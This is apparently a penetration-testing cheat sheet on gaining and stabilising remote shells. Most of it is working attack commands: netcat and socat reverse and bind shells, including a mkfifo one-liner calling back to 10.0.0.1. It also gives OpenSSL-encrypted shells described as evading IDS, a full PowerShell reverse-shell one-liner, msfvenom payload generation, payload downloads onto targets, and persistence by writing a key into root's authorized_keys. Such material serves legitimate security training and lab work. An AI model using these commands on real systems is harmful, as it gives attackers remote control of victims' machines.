# Shells

### Shells[​](broken-reference) <a href="#shells" id="shells"></a>

**Different sources**[**​**](broken-reference)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[Reverse Shell Cheat Sheet Pentestmonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

Kali Linux also comes pre-installed with a variety of webshells located at `/usr/share/webshells`. The [SecLists repo](https://github.com/danielmiessler/SecLists), though primarily used for wordlists, also contains some very useful code for obtaining shells.

**What is a shell?**[**​**](broken-reference)

In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In simple terms, we can force the remote server to either send us command line access to the server (a **reverse** shell), or to open up a port on the server which we can connect to in order to execute further commands (a **bind** shell).

**Types of shell**[**​**](broken-reference)

* **Reverse shell:** the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection.
* **Bind shells:** the code executed on the target is used to start a listener attached to a shell directly on the target. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

### Netcat[​](broken-reference) <a href="#netcat" id="netcat"></a>

It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system.

#### Reverse Shells[​](broken-reference) <a href="#reverse-shells" id="reverse-shells"></a>

* `-l` is used to tell netcat that this will be a listener
* `-v` is used to request a verbose output
* `-n` tells netcat not to resolve host names or use DNS.
* `-p` indicates that the port specification will follows

On the attacker's machine: \``nc` `` -lvp 1234` ``

On the victim's machine: \``nc` `-e /bin/sh` `` 10.0.0.1` ``

On the victim's machine if Netcat does not support the `-e` parameter:&#x20;

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

#### Bind Shells[​](broken-reference) <a href="#bind-shells" id="bind-shells"></a>

```
nc <target-ip> <chosen-port>
```

#### Netcat Shell Stabilitation[​](broken-reference) <a href="#netcat-shell-stabilitation" id="netcat-shell-stabilitation"></a>

These shells are very unstable by default. Pressing `Ctrl + C` kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat "shells" really being processes running inside a terminal, rather than being bonafide terminals in their own right.

**Technique 1: Python**[**​**](broken-reference)

Is applicable only to Linux boxes, as they will nearly always have Python installed by default.

1. use `python -c 'import pty;pty.spawn("/bin/bash")'`, qich uses Python to spawn a better featured bah shell (try with `python`, `python2`or `python3`). At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
2. `export TERM=xterm`. This will give us access to term commands such as `clear`.
3. Finally (and most importantly) we will background the shell using `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

**Technique 2: rlwrap**[**​**](broken-reference)

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`. To use rlwrap, we invoke a slightly different listener:

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

**Technique 3: Socat**[**​**](broken-reference)

Use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets. as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary `sudo python3 -m http.server 80`, then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget `wget <LOCAL-IP>/socat -O /tmp/socat`.

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`.

It's useful to be able to change your terminal tty size. First, open another terminal and run `stty -a`. This will give you a large stream of output. Note down the values for "rows" and columns.

Next, in your reverse/bind shell, type in: `stty rows <number>` and `stty cols <number>`.

### Socat[​](broken-reference) <a href="#socat" id="socat"></a>

Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box.

#### Reverse Shells[​](broken-reference) <a href="#reverse-shells-1" id="reverse-shells-1"></a>

This shell is unestable and equivalent to the netcat one, but will work on either Linux or Windows.

On Windows we would use this command to connect back:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target:

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

#### Bind Shells[​](broken-reference) <a href="#bind-shells-1" id="bind-shells-1"></a>

On a Linux target we would use the following command:

```
socat TCP-L:<PORT> EXEC:"bash -li"
```

On a Windows target we would use this command for our listener:

```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux.Here is the new listener syntax:

```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

The target must have socat installed. it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/socat?raw=true), which can then be executed as normal.

The special command is as follows:

```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

This is a handful, so let's break it down.

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:

* **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
* **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
* **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
* **setsid**, creates the process in a new session
* **sane**, stabilises the terminal, attempting to "normalise" it.

If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding `-d -d` into the command.

**Socat Encrypted Shells**[**​**](broken-reference)

[Aditional information](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)

Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.

Suffice to say that any time `TCP` was used as part of a command, this should be replaced with `OPENSSL` when working with encrypted shells.

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine: This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.

```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

We then need to merge the two created files into a single .pem file:

```
cat shell.key shell.crt > shell.pem
```

Now, when we set up our reverse shell listener, we use:

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

To connect back, we would use:

```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

The same technique would apply for a bind shell:

Target:

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

Attacker:

```
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

This technique will also work with the special, Linux-only TTY shell covered in the previous task

For setting up an OPENSSL-LISTENER using the tty technique.

```
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```

To connect back to this listener

```
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

### Common Shell Payloads[​](broken-reference) <a href="#common-shell-payloads" id="common-shell-payloads"></a>

In some versions of netcat there is a `-e` option which allows you to execute a process on connection. For example, as a listener: `nc -lvnp <PORT> -e /bin/bash` Connecting to the above listener with netcat would result in a bind shell on the target.

Equally, for a reverse shell, connecting back with `nc <LOCAL-IP> <PORT> -e /bin/bash` would result in a reverse shell on the target.

However, this is not included in most versions of netcat as it is widely seen to be very insecure. On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:

```
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

A very similar command can be used to send a netcat reverse shell:

```
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.

When targeting a **modern Windows Server**, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.

This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

In order to use this, we need to replace `"<IP>"` and `"<port>"` with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell.

### Msfvenom[​](broken-reference) <a href="#msfvenom" id="msfvenom"></a>

Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Part of the Metasploit framework, is used to generate code for primarily reverse and bind shells.

The standard syntax for msfvenom is as follows: `msfvenom -p <PAYLOAD> <OPTIONS>`.

For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:

```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

* `-f <format>` specifies the output format
* `-o <file>` The output location and filename for the generated payload
* `LHOST=<IP>`
* `LPORT=<port>`

#### Metasploit multi/handler[​](broken-reference) <a href="#metasploit-multihandler" id="metasploit-multihandler"></a>

The `auxiliary/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Multi/Handler is a superb tool for catching reverse shells.

1. Open Metasploit with `msfconsole`
2. Type `use multi/handler`, and press enter

Lets look at the available `options` command. There are three options we need to set: `payload`, `LHOST` and `LPORT`. Let's do this by using the `exploit -j` command. This tells Metasploit to launch the module, running as a job in the background. Ww will habe to use `sessions`

### Webshells[​](broken-reference) <a href="#webshells" id="webshells"></a>

There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. In these cases we would instead upload a webshell. **(Upload Vulnerabilities Room)**

### **Upgrade a Shell**

* [Upgrade a shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

After we run this command, we will hit `ctrl+z` to background our shel and get back to our local terminal, and input the following stty command:

```
stty raw -echo
fg
[enter]
[enter]
```

Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back.

We may notice that our shell does not cover the entire terminal. To fix this, we need to do this.

On our local machine:

```bash
echo $TERM
#xterm-256color
stty size
#60 300
```

On the victim's machine:

```
export TERM=xterm-256color
stty rows 60 columns 300
```

### Gain a shell with write access to a users .ssh directory

If we find ourselves with write access to a users`/.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:

```
ssh-keygen -f key
```

This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:

```
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

Now, the remote server should allow us to log in as that user by using our private key:

```
ssh root@10.10.10.10 -i key
```
